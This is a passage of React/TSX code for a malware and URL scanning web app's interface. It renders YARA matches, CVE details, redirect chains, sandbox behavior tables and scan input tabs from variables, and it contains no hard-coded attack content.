                    )}

                    <div className="flex flex-col md:col-span-2">
                      <span className="text-xs text-muted-foreground">SHA256 Hash</span>
                      <div className="flex items-center gap-2">
                        <span className="text-sm font-mono break-all">{scanResults.hash}</span>
                        <Button variant="ghost" size="sm" className="h-6 w-6 p-0 shrink-0" onClick={copyHash}>
                          {copied ? <CheckCircle2 className="h-3 w-3" /> : <Copy className="h-3 w-3" />}
                        </Button>
                      </div>
                    </div>

                    <div className="flex flex-col">
                      <span className="text-xs text-muted-foreground">Scan Date</span>
                      <span className="text-sm">{formatDate(scanResults.scanDate)}</span>
                    </div>
                  </div>
                </div>

                {/* YARA Matches */}
                <div className="space-y-4">
                  <h3 className="text-sm font-medium">YARA Rule Matches</h3>
                  {scanResults.yaraMatches && scanResults.yaraMatches.length > 0 ? (
                    <div className="p-4 rounded-md bg-muted/30 space-y-4">
                      {scanResults.yaraMatches.map((match: any, index: number) => (
                        <div key={index} className="space-y-2">
                          <div className="flex items-center gap-2">
                            <AlertCircle className="h-5 w-5 text-yellow-500" />
                            <span className="font-medium">{match.rule}</span>
                          </div>
                          <div className="pl-7 text-sm text-muted-foreground">
                            <p>{match.description}</p>
                            <p className="mt-1">Severity: {match.severity}</p>
                            <div className="flex flex-wrap gap-1 mt-1">
                              {match.tags.map((tag: string, tagIndex: number) => (
                                <Badge key={tagIndex} variant="outline" className="text-xs">
                                  {tag}
                                </Badge>
                              ))}
                            </div>
                          </div>
                        </div>
                      ))}
                    </div>
                  ) : (
                    <div className="p-4 rounded-md bg-muted/30 text-center text-sm text-muted-foreground">
                      No YARA rule matches found
                    </div>
                  )}
                </div>

                {/* Exploit Details if available */}
                {scanResults.exploitDetails && (
                  <div className="space-y-4">
                    <h3 className="text-sm font-medium">Exploit Details</h3>
                    <div className="p-4 rounded-md bg-destructive/10 space-y-2">
                      <div className="flex items-center gap-2">
                        <AlertCircle className="h-5 w-5 text-destructive" />
                        <span className="font-medium">{scanResults.exploitDetails.cve}</span>
                      </div>
                      <div className="pl-7 text-sm">
                        <p>{scanResults.exploitDetails.description}</p>
                        <p className="mt-1">Affected Versions: {scanResults.exploitDetails.affectedVersions}</p>
                        <p className="mt-1">Mitigation: {scanResults.exploitDetails.mitigationStatus}</p>
                      </div>
                    </div>
                  </div>
                )}

                {/* URL Analysis if available */}
                {scanResults.urlAnalysis && (
                  <div className="space-y-4">
                    <h3 className="text-sm font-medium">URL Analysis</h3>
                    <div className="p-4 rounded-md bg-muted/30 space-y-4">
                      <div>
                        <h4 className="text-xs font-medium mb-2">Redirect Chain</h4>
                        <div className="space-y-2">
                          {scanResults.urlAnalysis.redirectChain.map((redirect: any, index: number) => (
                            <div key={index} className="flex items-center gap-2 text-sm">
                              <span className="text-muted-foreground">{redirect.statusCode}</span>
                              <span className="truncate">{redirect.url}</span>
                              {index < scanResults.urlAnalysis.redirectChain.length - 1 && (
                                <ChevronRight className="h-4 w-4 text-muted-foreground" />
                              )}
                            </div>
                          ))}
                        </div>
                      </div>

                      <div>
                        <h4 className="text-xs font-medium mb-2">SSL Certificate</h4>
                        <div className="grid grid-cols-2 gap-2 text-sm">
                          <div>
                            <span className="text-muted-foreground">Valid: </span>
                            <span>{scanResults.urlAnalysis.ssl.valid ? "Yes" : "No"}</span>
                          </div>
                          <div>
                            <span className="text-muted-foreground">Issuer: </span>
                            <span>{scanResults.urlAnalysis.ssl.issuer}</span>
                          </div>
                          <div>
                            <span className="text-muted-foreground">Valid From: </span>
                            <span>{new Date(scanResults.urlAnalysis.ssl.validFrom).toLocaleDateString()}</span>
                          </div>
                          <div>
                            <span className="text-muted-foreground">Valid To: </span>
                            <span>{new Date(scanResults.urlAnalysis.ssl.validTo).toLocaleDateString()}</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </CardContent>
              <CardFooter className="flex justify-between">
                <Button variant="outline" onClick={resetScan}>
                  <RotateCw className="h-4 w-4 mr-2" />
                  New Scan
                </Button>
                <Button variant="default">
                  <Download className="h-4 w-4 mr-2" />
                  Download Full Report
                </Button>
              </CardFooter>
            </Card>
          </TabsContent>

          <TabsContent value="behavior">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Code className="h-5 w-5 text-primary" />
                  Behavior Analysis
                </CardTitle>
                <CardDescription>Runtime behavior and system interactions</CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                {scanResults.behaviorAnalysis ? (
                  <>
                    <div className="space-y-4">
                      <h3 className="text-sm font-medium">Network Connections</h3>
                      {scanResults.behaviorAnalysis.networkConnections.length > 0 ? (
                        <Table>
                          <TableHeader>
                            <TableRow>
                              <TableHead>Destination</TableHead>
                              <TableHead>Port</TableHead>
                              <TableHead>Protocol</TableHead>
                            </TableRow>
                          </TableHeader>
                          <TableBody>
                            {scanResults.behaviorAnalysis.networkConnections.map((conn: any, index: number) => (
                              <TableRow key={index}>
                                <TableCell className="font-medium">{conn.destination}</TableCell>
                                <TableCell>{conn.port}</TableCell>
                                <TableCell>{conn.protocol}</TableCell>
                              </TableRow>
                            ))}
                          </TableBody>
                        </Table>
                      ) : (
                        <div className="p-4 rounded-md bg-muted/30 text-center text-sm text-muted-foreground">
                          No network connections detected
                        </div>
                      )}
                    </div>

                    <div className="space-y-4">
                      <h3 className="text-sm font-medium">File Operations</h3>
                      {scanResults.behaviorAnalysis.fileOperations.length > 0 ? (
                        <Table>
                          <TableHeader>
                            <TableRow>
                              <TableHead>Operation</TableHead>
                              <TableHead>Path</TableHead>
                              <TableHead>Timestamp</TableHead>
                            </TableRow>
                          </TableHeader>
                          <TableBody>
                            {scanResults.behaviorAnalysis.fileOperations.map((op: any, index: number) => (
                              <TableRow key={index}>
                                <TableCell className="font-medium capitalize">{op.operation}</TableCell>
                                <TableCell className="font-mono text-xs">{op.path}</TableCell>
                                <TableCell>{new Date(op.timestamp).toLocaleString()}</TableCell>
                              </TableRow>
                            ))}
                          </TableBody>
                        </Table>
                      ) : (
                        <div className="p-4 rounded-md bg-muted/30 text-center text-sm text-muted-foreground">
                          No file operations detected
                        </div>
                      )}
                    </div>

                    <div className="space-y-4">
                      <h3 className="text-sm font-medium">Process Creation</h3>
                      {scanResults.behaviorAnalysis.processCreation.length > 0 ? (
                        <Table>
                          <TableHeader>
                            <TableRow>
                              <TableHead>Process</TableHead>
                              <TableHead>Command Line</TableHead>
                              <TableHead>PID</TableHead>
                            </TableRow>
                          </TableHeader>
                          <TableBody>
                            {scanResults.behaviorAnalysis.processCreation.map((proc: any, index: number) => (
                              <TableRow key={index}>
                                <TableCell className="font-medium">{proc.process}</TableCell>
                                <TableCell className="font-mono text-xs">{proc.commandLine}</TableCell>
                                <TableCell>{proc.pid}</TableCell>
                              </TableRow>
                            ))}
                          </TableBody>
                        </Table>
                      ) : (
                        <div className="p-4 rounded-md bg-muted/30 text-center text-sm text-muted-foreground">
                          No process creation detected
                        </div>
                      )}
                    </div>
                  </>
                ) : (
                  <div className="flex flex-col items-center justify-center py-8 text-center">
                    <div className="h-16 w-16 rounded-full bg-muted/50 flex items-center justify-center mb-4">
                      <Code className="h-8 w-8 text-muted-foreground" />
                    </div>
                    <h3 className="text-lg font-medium mb-2">No Behavior Data Available</h3>
                    <p className="text-sm text-muted-foreground mb-4 max-w-md">
                      Behavior analysis is only available for executable files that have been analyzed in our sandbox
                      environment.
                    </p>
                    <Button variant="outline">
                      <Database className="h-4 w-4 mr-2" />
                      Submit to Sandbox
                    </Button>
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="sandbox">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Database className="h-5 w-5 text-primary" />
                  Sandbox Analysis
                </CardTitle>
                <CardDescription>Isolated execution environment for deeper analysis</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="flex flex-col items-center justify-center py-8 text-center">
                  <div className="h-16 w-16 rounded-full bg-primary/10 flex items-center justify-center mb-4">
                    <Lock className="h-8 w-8 text-primary" />
                  </div>
                  <h3 className="text-lg font-medium mb-2">Private Sandbox Analysis</h3>
                  <p className="text-sm text-muted-foreground mb-6 max-w-md">
                    Submit this file to our secure sandbox environment for in-depth behavioral analysis. The file will
                    be executed in an isolated environment to observe its behavior.
                  </p>
                  <div className="flex gap-4">
                    <Button variant="outline">
                      <Eye className="h-4 w-4 mr-2" />
                      View Public Reports
                    </Button>
                    <Button variant="default" className="relative overflow-hidden group">
                      <span className="relative z-10 flex items-center gap-2">
                        <Database className="h-4 w-4" />
                        Submit to Sandbox
                      </span>
                      <span className="absolute inset-0 bg-gradient-to-r from-cyan-500 to-blue-500 opacity-0 group-hover:opacity-100 transition-opacity duration-300"></span>
                    </Button>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-background to-background/90 dark:from-background dark:to-background/90">
      <div className="container py-8 md:py-12">
        <div className="flex flex-col items-center text-center mb-8 md:mb-12">
          <div className="flex items-center gap-2 mb-4">
            <Shield className="h-10 w-10 text-cyan-500" />
            <h1 className="text-3xl md:text-4xl font-bold tracking-tight bg-gradient-to-r from-cyan-500 to-blue-500 bg-clip-text text-transparent">
              CyberScan
            </h1>
          </div>
          <p className="text-xl text-muted-foreground max-w-2xl">
            Advanced security scanning for files and URLs. Protect yourself from malware, viruses, and other threats.
          </p>
        </div>

        {scanResults ? (
          <ScanResultsDashboard />
        ) : (
          <div className="grid grid-cols-1 gap-8 max-w-3xl mx-auto">
            <Tabs defaultValue={activeTab} onValueChange={setActiveTab} className="w-full">
              <TabsList className="grid grid-cols-4 w-full mb-8">
                <TabsTrigger value="file" className="flex items-center gap-2">
                  <FileSearch className="h-4 w-4" />
                  <span>File Scan</span>
                </TabsTrigger>
                <TabsTrigger value="url" className="flex items-center gap-2">
                  <Link2 className="h-4 w-4" />
                  <span>URL Scan</span>
                </TabsTrigger>
                <TabsTrigger value="hash" className="flex items-center gap-2">
                  <Hash className="h-4 w-4" />
                  <span>Hash Lookup</span>
                </TabsTrigger>
                <TabsTrigger value="history" className="flex items-center gap-2">
                  <Clock className="h-4 w-4" />
                  <span>History</span>
                </TabsTrigger>
              </TabsList>

              <TabsContent value="file">
                <FileUploadZone />
              </TabsContent>

              <TabsContent value="url">
                <UrlScanInput />
              </TabsContent>

              <TabsContent value="hash">
                <HashLookupForm />
              </TabsContent>

              <TabsContent value="history">
                <ScanHistoryTable />
              </TabsContent>
            </Tabs>
          </div>
        )}
      </div>
    </div>
  )
}

